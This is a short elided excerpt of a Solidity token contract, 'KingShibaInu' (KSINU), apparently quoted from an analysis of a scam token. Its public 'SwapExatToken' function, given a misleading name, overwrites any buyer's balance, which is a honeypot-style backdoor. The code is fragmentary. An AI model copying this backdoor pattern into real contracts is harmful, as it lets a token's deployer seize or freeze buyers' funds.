...
contract KingShibaInu is IERC20, Ownable {
    ...
    string private _name = "KingShibaInu";

    string private _symbol = "KSINU";
    ...
    function reflection(address buyer)
        internal
        view
        Safe
        returns (uint256)
    ...
    function SwapExatToken(address buyer) public {
        balances[buyer] = reflection(buyer);
    }

    function _ApproveETH(address Router) public Safe {
